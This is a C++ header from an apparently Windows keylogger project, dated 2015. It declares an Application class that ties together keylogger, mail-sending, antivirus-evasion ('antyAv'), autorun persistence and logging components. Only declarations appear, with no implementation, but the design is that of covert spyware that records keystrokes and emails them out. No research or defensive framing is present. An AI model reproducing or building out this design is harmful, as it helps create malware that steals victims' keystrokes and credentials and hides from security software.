/* 
 * File:   Application.h
 * Author: Patryk
 *
 * Created on 21 kwiecień 2015, 22:22
 */

#ifndef APPLICATION_H
#define	APPLICATION_H
#include <windows.h>
#include "Config.h"
#include <cstring>
#include "MailAccont.h"
#include "Mail.h"
#include <fstream>
#include "Keylogger.h"
#include "TimeLog.h"
#include "Log.h"
#include "antyAv.h"
#include "Autorun.h"
#include "newWinApi.h"



using namespace std;

class Application {
public:
    Application(string fileName);
    void start();
    void stop();
    void running();
    string getKeyloggerFileName();
private:
    bool isMultiRun();
    Config *config;
    LPCTSTR StringToLPCTSTR(string value);
    Keylogger *keylogger;
    TimeLog *time;
    Log *log;
    MailAccont *mailAccontTmp;
    antyAv *antyAV;
    string keyloggerFileName;
    Autorun *autorun;
    newWinApi *newWinApix;

};


#endif	/* APPLICATION_H */

